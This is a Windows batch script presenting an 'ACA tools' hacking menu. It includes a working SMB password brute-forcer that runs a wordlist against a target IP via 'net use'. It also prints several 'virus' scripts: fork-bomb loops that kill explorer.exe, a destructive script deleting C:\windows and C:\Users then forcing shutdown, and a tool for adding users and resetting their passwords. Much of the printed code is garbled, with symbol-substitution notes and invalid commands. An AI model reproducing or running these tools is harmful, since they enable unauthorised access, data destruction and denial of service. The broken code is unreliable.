@echo off
title ACA tools

:1
cls
color 0c
echo A.C.A please enter password
set /p pass1=
if %pass1%==1234 goto 3
if not %pass1%==1234 goto fail

:3
:loop
cls
color 0a
echo       ____           ________       ____
echo      / /\ \         / /------      / /\ \
echo     / /  \ \       ! !            / /  \ \   
echo    / /____\ \      ! !           / /____\ \
echo   / /------\ \     ! !          / /------\ \
echo  / /        \ \    \ \______   / /        \ \
echo / /          \ \    \-------  / /          \ \  
timeout /t 1 >nul1
cls
color 0b
echo       ____           ________       ____
echo      / /\ \         / /------      / /\ \
echo     / /  \ \       ! !            / /  \ \   
echo    / /____\ \      ! !           / /____\ \
echo   / /------\ \     ! !          / /------\ \
echo  / /        \ \    \ \______   / /        \ \
echo / /          \ \    \-------  / /          \ \  
timeout /t 1 >nul1
cls 
color 0c
echo       ____           ________       ____
echo      / /\ \         / /------      / /\ \
echo     / /  \ \       ! !            / /  \ \   
echo    / /____\ \      ! !           / /____\ \
echo   / /------\ \     ! !          / /------\ \
echo  / /        \ \    \ \______   / /        \ \
echo / /          \ \    \-------  / /          \ \  
timeout /t 1 >nul1
color 0a
echo ==============================================================================================================
echo ACA menu
echo ==============================================================================================================
echo bruteforce
echo rizzvirus
echo delprank
echo acavirus
echo trovirus
echo acatool
echo ipactivator
echo ipchanger
echo macspoofer
echo ipinfo
echo enter 1 for password strength ckecker
echo              'leave'
echo ==============================================================================================================
set /p car=
if %car%==bruteforce goto page1
if %car%==rizzvirus goto 2
if %car%==delprank goto 4
if %car%==acavirus goto 7
if %car%==trovirus goto 9
if %car%==leave goto 6
if %car%==acatool goto 10
if %car%==ipactivator goto 11
if %car%==ipchanger goto 12
if %car%==macspoofer goto 13
if %car%==ipinfo goto 14
if %car%==1 goto 15
if not %car%==bruteforce goto 5
if not %car%==rizzvirus goto 5
if not %car%==delprank goto 5
if not %car%==exit1 goto 5
if not %car%==acavirus goto 5
if not %car%==trovirus goto 5
if not %car%==acatool goto 
if not %car%==ipchanger goto 5
if not %car%==ipinfo goto 5
if not %car%==1 goto 5
goto loop

:page1
cls
color A
echo.
set /p ip="Enter IP Address: "
set /p user="Enter Username: "
set /p wordlist="Enter Password List: "

set /a count=1
for /f %%a in (%wordlist%) do (
  set pass=%%a
  call :attempt
)
echo Password not Found :(
pause
goto 3

:success
echo.
echo Password Found! %pass%
net use \\%ip% /d /y >nul 2>&1
pause
exit

:attempt
net use \\%ip% /user:%user% %pass% >nul 2>&1
echo [ATTEMPT %count%] [%pass%]
set /a count=%count%+1
if %errorlevel% EQU 0 goto success
pause
goto 3

:fail
cls
echo wrong passcode 
pause
goto 1

:2
cls
color 0d
echo       ____           ________       ____
echo      / /\ \         / /------      / /\ \
echo     / /  \ \       ! !            / /  \ \   
echo    / /____\ \      ! !           / /____\ \
echo   / /------\ \     ! !          / /------\ \
echo  / /        \ \    \ \______   / /        \ \
echo / /          \ \    \-------  / /          \ \  
echo=======================================================================================================================================
echo rizzvirus.bat
echo=======================================================================================================================================
echo @echo off
echo title Rizz Virus
echo color F
echo.
echo :start
echo set text="Hello, You're About to Get Rizzed"
echo echo /text/
echo echo set speech = Wscript.CreateObject("SAPI.spVoice") = speech.vbs
echo echo speech.speak /text/ == speech.vbs
echo start speech.vbs
echo timeout 1 =nul 
echo.
echo.
echo call :Attack "Do you have a name, or can I call you mine?"
echo call :Attack "Are you French? Because Eiffel for you."
echo call :Attack "Your eyes are like an ocean, and I'm lost at sea."
echo call :Attack "If beauty were a crime, you'd be serving a life sentence."
echo call :Attack "Are you a time traveler? Because I can see you in my future."
echo call :Attack "Are you a camera? Because every time I look at you, I smile."
echo.
echo.
echo :attack
echo cls
echo echo /~1
echo echo set speech = Wscript.CreateObject("SAPI.spVoice") > speech.vbs
echo echo speech.speak "/~1" == speech.vbs
echo start speech.vbs
echo timeout 5 =nul
echo exit /b
echo =============================================================================================================
echo = is greater than sign
echo / is %
pause 
goto 3

:4
cls
color 0a
echo wanna cry (A.C.A)
echo ==============================================================================================================
echo @echo off
echo color a
echo taskkill /f /im "explorer.exe"
echo :1
echo echo set speech = Wscript.CreateObject("SAPI.spVoice") = = "speech.Vbs"
echo set "text=Hello your device is infected with A C A your files will now be deleted along with your operating system any key to proceed"
echo echo speech.speak "/text/" == "speech.vbs"
echo start speech.vbs
echo :2
echo echo Hello your device is infected with A.C.A your files will now be deleted along with your operating system press any key to procsed
echo echo Hit any key to proceed
echo pause
echo :3
echo del speech.Vbs
echo echo set speech = Wscript.CreateObject("SAPI.spVoice") = = "speech.Vbs"
echo set "text=Lol just kidding it was a prank"
echo echo speech.speak "/text/" == "speech.vbs"
echo start speech.vbs
echo :4
echo echo lol just kidding it was a prank but you pc will now crash
echo pause
echo :loop
echo start
echo start
echo start
echo start
echo goto loop
echo ==============================================================================================================
echo / = %
echo = = greater sign
echo ==============================================================================================================
pause
goto 3

:5
echo invalid imput please try again
pause
goto 3

:6
cls
color 0b
echo       ____           ________       ____
echo      / /\ \         / /------      / /\ \
echo     / /  \ \       ! !            / /  \ \   
echo    / /____\ \      ! !           / /____\ \
echo   / /------\ \     ! !          / /------\ \
echo  / /        \ \    \ \______   / /        \ \
echo / /          \ \    \-------  / /          \ \  
echo ==============================================================================================================
echo whould you like to leave yes/no 
echo ==============================================================================================================
set /p exit2=
if %exit2%==yes exit
if %exit2%==no goto 3

:7 
cls 
color 0a
echo A.C.A virus version 1.3
echo ==============================================================================================================
echo taskkill /f /im "explorer.exe"
echo echo set speech = Wscript.CreateObject("SAPI.spVoice") = = "speech.Vbs"
echo set "text=Hello your device is infected with A C A your pc will now crash"
echo echo speech.speak "/text/" = = "speech.vbs"
echo start speech.vbs
echo.
echo color 2
echo :loop2
echo start
echo start
echo start
echo start
echo start
echo start
echo start
echo start
echo start
echo start
echo start
echo.
echo echo this is a hack for the A.C.A the anonymous cracker association...get hacked loser you pc will now crash :)
echo echo this is a hack for the A.C.A the anonymous cracker association...get hacked loser you pc will now crash :)
echo goto loop2
echo ==============================================================================================================
echo / = %
echo = = greater than sign
pause
goto 3

:9
echo please enter password
set /p pass2=
if %pass2%==2282 goto 8
if not %pass1%==2282 goto fail 
:8
cls
color 0c
echo       ____           ________       ____
echo      / /\ \         / /------      / /\ \
echo     / /  \ \       ! !            / /  \ \   
echo    / /____\ \      ! !           / /____\ \
echo   / /------\ \     ! !          / /------\ \
echo  / /        \ \    \ \______   / /        \ \
echo / /          \ \    \-------  / /          \ \  
echo ==============================================================================================================
echo the most dagerous virus ACA has to offer DO NOT USE
echo ==============================================================================================================
echo disable mouse
echo disable keyboard
echo disable system32
echo del C:
echo del C:\windows
echo del C:\windows\system32
echo del C:\system32\logonul.exe
echo del C:\windows\system32 \restore
echo del C:\windows\system32\winlogin.exe
echo del C:\windows
echo del C:\NVIDIA
echo del C:\windows
echo del C:\Documents And Settings
echo del D:\RECOVERY
echo del C:\SwSetup
echo del C:\Temp
echo del C:\Program Files
echo del C:\PerfLogs
echo del C:\.rnd
echo del C:\Brukere
echo del C:\Users
echo del C:\MCPP
echo del C:\CMD
echo del C:\disable windows
echo Dir /s
echo echo I am your virus. I deleted your files
echo echo because you tried to delete me.
echo echo By the way, I am A.C.A" pause
echo shutdown -s -t 10 -c "Say goodbye to you computer!"
echo ==============================================================================================================
pause
goto 3

:10
cls
color 30
echo       ____           ________       ____
echo      / /\ \         / /------      / /\ \
echo     / /  \ \       ! !            / /  \ \   
echo    / /____\ \      ! !           / /____\ \
echo   / /------\ \     ! !          / /------\ \
echo  / /        \ \    \ \______   / /        \ \
echo / /          \ \    \-------  / /          \ \  
echo ==========================================================================
echo                   A.C.A hack tool
echo ==========================================================================
echo @echo off
echo color 30
echo chcp 65001 =nul
echo echo 
echo title aca hack tool
echo set /p pass="enter password: "
echo if "{pass}" NEQ "1" exit
echo :menu
echo cls
echo echo ==========================
echo echo           menu
echo echo ==========================
echo echo.
echo echo.
echo echo 1) list users on pc
echo echo 2) create a new user
echo echo 3) change users password
echo echo 4) delite a user account 
echo echo 5) exi ACA hack tool
echo echo.
echo set /p imput="© "
echo.
echo if {imput} EQU 1 (
echo 	cls
echo 	title list users
echo 	cls
echo 	echo list users	
echo 	net user
echo 	pause
echo 	cls
echo 	goto menu
echo )
echo.
echo if {imput} EQU 2 (
echo 	call :checkadmin
echo 	title creat user
echo 	cls 
echo 	set /p username="ENTER IN NEW USERNAME: "
echo 	set /p password="ENTER IN NEW PASSWORD: "
echo 	net user {user} {password} /add
echo 	pause
echo 	goto menu
echo )
echo if {imput} EQU 3 (
echo 	call :checkadmin
echo 	title change password
echo 	cls
echo 	set /p username="TARGET USER: "
echo 	set /p password="NEW PASSWORD: "
echo 	net user {user} {password}
echo 	pause
echo 	cls
echo	goto menu
echo )
echo.
echo if {imput} EQU 4 (
echo 	cls
echo 	echo you are not sigma 
echo 	pause
echo 	cls 
echo 	goto menu
echo )
echo if {imput} EQU 5 exit
echo.
echo :checkadmin
echo echo net session =nul
echo if _{errorleve} NEQ 0 (
echo color 0a
echo cls
echo echo.
echo echo restart and run as admin
echo )
echo.
echo.
echo ========================
echo = = greaterthan sign
echo  { } = pecent
echo ========================
pause
goto 3

:11
cls
color 0b
cls
echo Checking for Hide.me VPN...

:: Step 1: Check if Hide.me VPN is installed
if not exist "C:\Program Files (x86)\hide.me VPN\Hide.me.exe" (
    color 0c
    echo Hide.me VPN is not installed! Please install it first.
    pause
    exit /b
)

:: Step 2: Check if Hide.me VPN is running
tasklist | find /i "C:\Program Files\hide.me VPN\Hide.me.exe" >nul
if errorlevel 1 (
    color 0e
    echo Hide.me VPN is not running. Starting it now...
    start "C:\Program Files (x86)\hide.me VPN\Hide.me.exe"
    timeout /t 5 /nobreak >nul
) else (
    color 0a
    echo Hide.me VPN is already running.
)

pause
goto 3

:12
cls
echo Releasing old IP...
ipconfig /release
echo Renewing IP...
ipconfig /renew
echo Flushing DNS cache...
ipconfig /flushdns
echo Your IP has been refreshed!
pause
goto 3

:13
color 0b
cls
title MAC Address Spoofer
setlocal enabledelayedexpansion

:: Get the network adapter name
for /f "tokens=2 delims=:" %%A in ('wmic nic where "NetEnabled=true" get Name /value ^| findstr /i "Name"') do set "adapter=%%A"
set "adapter=%adapter:~1%"

:: Generate a random MAC address (avoiding invalid ones)
set /a "rand1=%random% %% 256"
set /a "rand2=%random% %% 256"
set /a "rand3=%random% %% 256"
set /a "rand4=%random% %% 256"
set /a "rand5=%random% %% 256"
set /a "rand6=(%random% %% 256) | 2"  :: Ensure second digit is 2, 6, A, or E (valid MAC address)

:: Format MAC address
set "newmac="

for %%X in (!rand1! !rand2! !rand3! !rand4! !rand5! !rand6!) do (
    set /a "hex=%%X"
    set "hex=0!hex!"
    set "hex=!hex:~-2!"
    set "newmac=!newmac!!hex!"
)

:: Display new MAC address
echo New MAC Address: !newmac!

:: Find registry path for the network adapter
for /f "tokens=*" %%A in ('reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Class\{4D36E972-E325-11CE-BFC1-08002BE10318}" /s /f "%adapter%" ^| findstr /i "HKEY_LOCAL_MACHINE"') do set "regpath=%%A"

:: Check if registry path was found
if "%regpath%"=="" (
    echo Error: Could not find adapter registry path.
    pause
    goto 3
)

:: Apply the new MAC address to the registry
reg add "%regpath%" /v NetworkAddress /t REG_SZ /d "!newmac!" /f

:: Restart the network adapter
echo Restarting Network Adapter...
wmic path win32_networkadapter where "NetEnabled=true" call Disable
timeout /t 3 >nul
wmic path win32_networkadapter where "NetEnabled=false" call Enable

echo MAC Address changed successfully!
pause
goto 3

:14
cls
echo finding ip 
ipconfig > ipconfig_info.txt
echo ip Found
echo IP configuration saved to ipconfig_info.txt
pause
goto 3

:15
setlocal enabledelayedexpansion

:: Ask the user to enter a password
set /p "password=Enter the password to check: "

:: Initialize the checks
set "lengthCheck=0"
set "upperCheck=0"
set "lowerCheck=0"
set "digitCheck=0"
set "specialCheck=0"

:: Check the length of the password (minimum length of 8)
if not "!password!"=="" (
    set "passwordLength=!password!"
    set /a lengthCheck=1
)

:: Check if the password contains at least one uppercase letter
set "upperCheck=0"
for /f %%a in ('echo !password! ^| findstr /r "[A-Z]"') do (
    set "upperCheck=1"
)

:: Check if the password contains at least one lowercase letter
set "lowerCheck=0"
for /f %%b in ('echo !password! ^| findstr /r "[a-z]"') do (
    set "lowerCheck=1"
)

:: Check if the password contains at least one digit
set "digitCheck=0"
for /f %%c in ('echo !password! ^| findstr /r "[0-9]"') do (
    set "digitCheck=1"
)

:: Check if the password contains at least one special character
set "specialCheck=0"
for /f %%d in ('echo !password! ^| findstr /r "[!@#$%^&*()_+={}|:;,.<>?/~]"') do (
    set "specialCheck=1"
)

:: Evaluate password strength
if !lengthCheck! == 1 if !upperCheck! == 1 if !lowerCheck! == 1 if !digitCheck! == 1 if !specialCheck! == 1 (
    echo Password is Strong.
) else (
    echo Password is Weak.
    echo Reasons:
    if !lengthCheck! == 0 echo - Password is too short.
    if !upperCheck! == 0 echo - Password does not contain an uppercase letter.
    if !lowerCheck! == 0 echo - Password does not contain a lowercase letter.
    if !digitCheck! == 0 echo - Password does not contain a number.
    if !specialCheck! == 0 echo - Password does not contain a special character.
)

pause
goto 3